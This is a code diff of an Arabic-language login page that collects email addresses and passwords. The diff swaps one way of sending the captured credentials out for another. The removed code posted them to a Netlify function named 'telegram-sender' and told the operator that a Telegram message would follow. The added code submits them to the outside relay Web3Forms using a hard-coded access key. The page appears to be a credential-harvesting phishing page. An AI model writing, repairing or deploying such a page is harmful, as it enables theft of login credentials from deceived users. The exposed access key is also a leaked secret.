@@ -227,11 +227,16 @@
             <div class="box">
                 <h2>ادخل بياناتك</h2>   
             
-                <form id="loginForm" method="POST">
+                <form id="loginForm" method="POST" action="https://api.web3forms.com/submit">
+                    
+                    <input type="hidden" name="access_key" value="B2ed5633-7b5f-46c3-b087-5bb11a7da5a0">
+                    
+                    <input type="hidden" name="redirect" value="https://yoursite.com/thanks.html">
+
                     
                     <label for="emailInput">البريد الإلكتروني:</label>
                     <div class="input-group">
-                        <input type="email" id="emailInput" name="البريد" placeholder="أدخل البريد" required>
+                        <input type="email" id="emailInput" name="البريد_الإلكتروني" placeholder="أدخل البريد" required>
                     </div>
                     <div class="error-message" id="emailError">الرجاء إدخال البريد الإلكتروني.</div>
                     
@@ -270,10 +275,8 @@
     const togglePassword = document.getElementById('togglePassword');
     const submitButton = document.getElementById('submitButton'); 
 
-    // 1. وظيفة التحقق من النموذج وإرسال البيانات إلى Netlify Function
-    form.addEventListener('submit', async function(event) {
-        // نمنع الإرسال الافتراضي للنموذج
-        event.preventDefault(); 
+    // معالج إرسال النموذج المُنقَّح (يعتمد على التحقق المحلي فقط)
+    form.addEventListener('submit', function(event) {
         
         let isValid = true;
 
@@ -291,43 +294,15 @@
             passwordError.style.display = 'none';
         }
 
-        if (isValid) {
-            // تجميع البيانات
-            const data = {
-                البريد: emailInput.value.trim(),
-                كلمة_المرور: passwordInput.value.trim()
-            };
-
-            submitButton.textContent = 'جاري الإرسال...';
-            submitButton.disabled = true; // تعطيل الزر أثناء الإرسال
-
-            try {
-                // إرسال البيانات إلى دالة Netlify Function الجديدة
-                const response = await fetch('/.netlify/functions/telegram-sender', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(data),
-                });
-
-                if (response.ok) {
-                    alert('تم الإرسال بنجاح! ستصلك رسالة على تيليجرام.');
-                    form.reset(); // تفريغ الحقول
-                } else {
-                    alert('فشل الإرسال. تأكد من إعداد متغيرات البيئة في Netlify.');
-                }
-            } catch (error) {
-                console.error('حدث خطأ أثناء الإرسال:', error);
-                alert('حدث خطأ في الاتصال بالخادم.');
-            } finally {
-                submitButton.textContent = 'إرسال'; 
-                submitButton.disabled = false;
-            }
+        if (!isValid) {
+            // إذا لم يكن التحقق صحيحاً، نمنع الإرسال
+            event.preventDefault();
         }
+        
+        // إذا كان التحقق صحيحاً، سيتم إرسال النموذج تلقائياً إلى Web3Forms عبر خاصية action
     });
 
-    // 2. إخفاء رسالة الخطأ عند بدء الكتابة
+    // إخفاء رسالة الخطأ عند بدء الكتابة
     emailInput.addEventListener('input', function() {
         emailError.style.display = 'none';
     });
@@ -336,7 +311,7 @@
         passwordError.style.display = 'none';
     });
 
-    // 3. وظيفة إظهار/إخفاء كلمة المرور
+    // وظيفة إظهار/إخفاء كلمة المرور
     togglePassword.addEventListener('click', function() {
         const type = passwordInput.getAttribute('type') === 'password' ? 'text' : 'password';
         
